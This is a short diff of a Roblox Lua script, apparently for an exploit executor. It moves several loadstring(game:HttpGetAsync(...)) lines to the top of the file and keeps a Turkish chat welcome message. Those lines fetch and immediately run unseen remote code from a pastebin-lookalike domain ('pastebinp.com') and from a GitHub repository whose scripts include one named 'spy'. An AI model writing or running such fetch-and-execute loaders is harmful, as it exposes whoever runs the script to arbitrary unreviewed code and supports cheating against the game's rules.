@@ -1,3 +1,8 @@
+loadstring(game:HttpGetAsync("https://pastebinp.com/raw/e8NK6hE1"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/savecpugpu"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/Anims.lua"))()
+
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Hoşgeldin, " .. game.Players.LocalPlayer.Name .. "! ";
                Color = Color3.fromRGB(161, 91, 228);
@@ -49,9 +54,3 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {
                TextSize = 16
                
            })
-
---loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
-loadstring(game:HttpGetAsync("https://pastebinp.com/raw/e8NK6hE1"))()
-setfpscap(120)
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/Anims.lua"))()
